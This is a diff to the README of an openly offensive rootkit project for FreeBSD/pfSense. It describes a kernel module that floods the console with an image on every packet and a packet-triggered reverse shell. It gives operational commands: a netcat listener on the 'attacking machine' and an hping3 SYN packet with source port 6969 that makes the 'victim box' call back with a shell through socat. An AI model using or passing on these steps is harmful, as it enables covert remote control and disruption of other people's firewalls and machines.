@@ -7,7 +7,7 @@ To compile "apeshit" within pfsense you need to use "clang15 -I/sys -o apeshit a
 "brickbox.ko" posts an image and funny message everytime a packet comes in or goes out, this can actually be stopped by running <kldunload brickbox.ko> but who da hell is gonna know dat.  It is completely still possible to run commands but the screen prints really fast so it is hard to see shit.  Inside unused is "make_brick_box_face.c" which has comments at the top for the makefile and creates this bin.
 
 We use socat since FreeBSD's native version of nc (netcat) doesn't allow for reverse shells.
-Run "nc -lvnp 6969" on the attaking machine before asking for a reverse shell since you need to be listening for it.
+Run "nc -lvnp 7000" on the attaking machine before asking for a reverse shell since you need to be listening for it, the listening port can't be 6969.
 To construct a packet that will trigger the packet filtering and send a reverse shell simply run
 "sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>"
 from your host machine targeting the ip of the victim box that has the rootkit, currently any destination port works.
